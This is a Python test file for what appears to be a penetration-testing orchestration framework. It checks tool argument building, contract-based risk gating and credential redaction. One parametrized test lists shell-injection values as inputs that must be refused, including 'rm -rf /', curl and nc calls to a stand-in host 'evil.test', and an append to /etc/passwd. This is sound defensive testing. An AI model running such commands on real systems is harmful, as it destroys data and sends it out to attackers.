"""Tool recipes: argument building and contract gating.

Two properties matter here and both are load-bearing. A parameter value must
never be able to become anything other than one argument, and a recipe's risk
tier must be decided by the contract rather than by the recipe.
"""

from __future__ import annotations

import pytest

from swarmstrike.engagement import Engagement
from swarmstrike.tools.recipes import (
    Recipe,
    RecipeError,
    Risk,
    authorize_risk,
    load_recipes,
)

CONTRACT = {
    "engagement": {
        "id": "ENG-TEST", "client": "C", "mission": "M",
        "authorized_by": {"name": "n", "role": "r", "email": "e",
                          "authorization_ref": "a", "signed_on": "2026-01-01"},
    },
    "window": {"start": "2026-10-01T00:00:00+00:00", "end": "2027-01-01T00:00:00+00:00"},
    "scope": {"domains": [{"name": "example.org"}]},
}


def contract(**roe) -> Engagement:
    doc = dict(CONTRACT)
    if roe:
        doc["rules_of_engagement"] = roe
    return Engagement.model_validate(doc)


NMAP = Recipe.model_validate({
    "name": "demo-nmap", "binary": "nmap", "summary": "scan",
    "risk": "active", "defaults": ["-Pn"],
    "parameters": [
        {"name": "target", "required": True, "format": "positional", "position": 1},
        {"name": "ports", "format": "flag_value", "flag": "-p"},
        {"name": "verbose", "type": "boolean", "format": "flag", "flag": "-v"},
        {"name": "rate", "type": "integer", "format": "flag_value", "flag": "-r",
         "minimum": 1, "maximum": 100},
        {"name": "mode", "type": "enum", "choices": ["fast", "slow"],
         "format": "flag_value", "flag": "-m"},
        {"name": "header", "format": "repeat", "flag": "-H"},
    ],
})


# ---------------------------------------------------------------------------
#  Argument building
# ---------------------------------------------------------------------------
def test_defaults_and_positional() -> None:
    assert NMAP.build_argv({"target": "www.example.org"}) == [
        "nmap", "-Pn", "www.example.org",
    ]


def test_flag_value_and_boolean_and_repeat() -> None:
    argv = NMAP.build_argv({
        "target": "www.example.org", "ports": "80,443",
        "verbose": True, "header": "A: 1,B: 2",
    })
    assert argv[:2] == ["nmap", "-Pn"]
    assert "-p" in argv and argv[argv.index("-p") + 1] == "80,443"
    assert "-v" in argv
    # Each repeat element becomes its own flag and its own argument.
    assert argv.count("-H") == 2
    assert argv[-1] == "www.example.org"


def test_boolean_false_emits_nothing() -> None:
    assert "-v" not in NMAP.build_argv({"target": "www.example.org", "verbose": False})


def test_unknown_parameter_is_refused_not_ignored() -> None:
    # Dropping it silently would mean an agent believes it constrained a scan
    # that then ran unconstrained.
    with pytest.raises(RecipeError, match="has no parameter"):
        NMAP.build_argv({"target": "www.example.org", "nonexistent": "1"})


def test_missing_required_parameter_is_refused() -> None:
    with pytest.raises(RecipeError, match="requires target"):
        NMAP.build_argv({"ports": "80"})


def test_enum_and_range_are_enforced() -> None:
    with pytest.raises(RecipeError, match="must be one of"):
        NMAP.build_argv({"target": "www.example.org", "mode": "turbo"})
    with pytest.raises(RecipeError, match="at most 100"):
        NMAP.build_argv({"target": "www.example.org", "rate": 5000})
    with pytest.raises(RecipeError, match="must be an integer"):
        NMAP.build_argv({"target": "www.example.org", "rate": "fast"})


# ---------------------------------------------------------------------------
#  A value must never become more than one argument
# ---------------------------------------------------------------------------
@pytest.mark.parametrize(
    "payload",
    [
        "www.example.org; rm -rf /",
        "www.example.org && curl evil.test",
        "www.example.org | nc evil.test 4444",
        "$(curl evil.test)",
        "`id`",
        "www.example.org\nnmap evil.test",
        "www.example.org || whoami",
        "a >> /etc/passwd",
    ],
)
def test_shell_syntax_in_a_value_is_refused(payload: str) -> None:
    with pytest.raises(RecipeError, match="shell syntax"):
        NMAP.build_argv({"target": payload})


def test_a_benign_value_stays_exactly_one_argument() -> None:
    # Spaces are legal in a value; the point is that it does not split.
    argv = NMAP.build_argv({"target": "www.example.org", "header": "User-Agent: a b c"})
    assert "User-Agent: a b c" in argv
    assert len([a for a in argv if a == "-H"]) == 1


def test_pattern_constrains_a_value() -> None:
    recipe = Recipe.model_validate({
        "name": "p", "binary": "nmap", "summary": "s",
        "parameters": [{"name": "ports", "format": "flag_value", "flag": "-p",
                        "pattern": r"[0-9,\-]{1,16}"}],
    })
    assert recipe.build_argv({"ports": "80,443"}) == ["nmap", "-p", "80,443"]
    # A value with no shell syntax that simply does not fit the pattern.
    with pytest.raises(RecipeError, match="does not match"):
        recipe.build_argv({"ports": "all-of-them"})
    # One with shell syntax is caught earlier, by the stronger check.
    with pytest.raises(RecipeError, match="shell syntax"):
        recipe.build_argv({"ports": "80;id"})


# ---------------------------------------------------------------------------
#  Contract gating
# ---------------------------------------------------------------------------
def test_passive_and_active_need_no_special_authorization() -> None:
    plain = contract()
    for risk in (Risk.PASSIVE, Risk.ACTIVE):
        allowed, _ = authorize_risk(risk, plain)
        assert allowed


def test_destructive_is_refused_even_when_everything_is_authorized() -> None:
    permissive = contract(
        exploitation={"allowed": True},
        credential_testing={"allowed": True},
        forbid_persistence=False,
        red_team={"enabled": True, "post_exploitation": True, "privilege_escalation": True,
                  "lateral_movement": True, "persistence": True, "evasion": True,
                  "exfiltration_simulation": True},
    )
    allowed, reason = authorize_risk(Risk.DESTRUCTIVE, permissive)
    assert not allowed
    assert "regardless of contract" in reason


@pytest.mark.parametrize(
    "risk",
    [Risk.POST_EXPLOITATION, Risk.PRIVILEGE_ESCALATION, Risk.LATERAL_MOVEMENT,
     Risk.PERSISTENCE, Risk.EXFILTRATION, Risk.EVASION],
)
def test_red_team_tiers_refused_on_a_plain_pentest_contract(risk: Risk) -> None:
    allowed, reason = authorize_risk(risk, contract())
    assert not allowed
    assert "red team" in reason


def test_persistence_needs_both_switches() -> None:
    # The standing prohibition has to be lifted and the phase has to be named.
    named_only = contract(red_team={"enabled": True, "persistence": True})
    allowed, reason = authorize_risk(Risk.PERSISTENCE, named_only)
    assert not allowed
    assert "forbid_persistence" in reason

    both = contract(forbid_persistence=False,
                    red_team={"enabled": True, "persistence": True})
    allowed, _ = authorize_risk(Risk.PERSISTENCE, both)
    assert allowed


def test_one_phase_does_not_authorize_another() -> None:
    only_recon = contract(red_team={"enabled": True, "post_exploitation": True})
    assert authorize_risk(Risk.POST_EXPLOITATION, only_recon)[0]
    assert not authorize_risk(Risk.LATERAL_MOVEMENT, only_recon)[0]
    assert not authorize_risk(Risk.PRIVILEGE_ESCALATION, only_recon)[0]


def test_intrusive_follows_the_exploitation_flag() -> None:
    assert not authorize_risk(Risk.INTRUSIVE, contract())[0]
    assert authorize_risk(Risk.INTRUSIVE, contract(exploitation={"allowed": True}))[0]


# ---------------------------------------------------------------------------
#  The shipped recipe book
# ---------------------------------------------------------------------------
def test_shipped_recipes_all_load() -> None:
    book = load_recipes()
    assert not book.errors, f"recipes failed to load: {book.errors}"
    assert len(book) >= 50


def test_every_shipped_recipe_builds_an_argv_from_its_required_parameters() -> None:
    book = load_recipes()
    checked = 0

    for recipe in book.recipes.values():
        required = [p for p in recipe.parameters if p.required]
        # A required value constrained by a pattern needs a recipe-specific
        # sample; this test is about every other recipe being well-formed.
        if any(p.pattern for p in required):
            continue

        supplied: dict[str, object] = {}
        for parameter in required:
            if parameter.type == "enum":
                supplied[parameter.name] = parameter.choices[0]
            elif parameter.type == "integer":
                supplied[parameter.name] = parameter.minimum or 1
            elif parameter.type == "boolean":
                supplied[parameter.name] = True
            else:
                supplied[parameter.name] = "www.example.org"

        try:
            argv = recipe.build_argv(supplied)
        except RecipeError as exc:
            raise AssertionError(f"{recipe.name}: {exc}") from exc

        assert argv[0] == recipe.binary, recipe.name
        checked += 1

    assert checked >= 45, f"only {checked} recipes were exercised"


def test_available_to_narrows_by_contract_and_domain() -> None:
    book = load_recipes()
    plain = book.available_to(contract())
    assert plain, "a plain contract should still authorize passive and active recipes"
    assert all(r.risk in (Risk.PASSIVE, Risk.ACTIVE) for r in plain)

    red = book.available_to(contract(
        exploitation={"allowed": True},
        red_team={"enabled": True, "lateral_movement": True},
    ))
    assert any(r.risk is Risk.LATERAL_MOVEMENT for r in red)
    assert len(red) > len(plain)

    web_only = book.available_to(contract(), domains=["web"])
    assert web_only and all("web" in r.domains for r in web_only)


# ---------------------------------------------------------------------------
#  Credential redaction
# ---------------------------------------------------------------------------
def test_sensitive_parameters_are_collected_for_redaction() -> None:
    book = load_recipes()
    recipe = book.get("netexec-auth")
    supplied = {"protocol": "smb", "target": "dc.example.org",
                "username": "pentest1", "password": "Sup3rSecret!"}

    # The value reaches the command, because the tool needs it.
    assert "Sup3rSecret!" in recipe.build_argv(supplied)
    # And it is reported as something that must not be written down.
    assert recipe.secret_values(supplied) == ["Sup3rSecret!"]


def test_a_flag_name_does_not_decide_sensitivity() -> None:
    # -p is a port list for nmap and a password for netexec, so the recipe
    # declares it rather than the executor guessing from the flag.
    book = load_recipes()
    assert book.get("nmap").secret_values({"target": "a.example.org", "ports": "80,443"}) == []


def test_short_values_are_not_treated_as_secrets() -> None:
    # Redacting a one-character value would blank out unrelated output.
    book = load_recipes()
    recipe = book.get("netexec-auth")
    assert recipe.secret_values({"protocol": "smb", "target": "h.example.org",
                                 "username": "u", "password": "ab"}) == []


def test_every_credential_parameter_in_the_book_is_marked() -> None:
    # A new recipe that takes a password and forgets the flag would write it
    # into the audit log, so this fails rather than letting that ship.
    names = {"password", "api_token", "api_key", "token", "secret", "passphrase"}
    missed: list[str] = []
    for recipe in load_recipes().recipes.values():
        for parameter in recipe.parameters:
            if parameter.name in names and not parameter.sensitive:
                missed.append(f"{recipe.name}.{parameter.name}")
    assert not missed, f"unmarked credential parameters: {missed}"
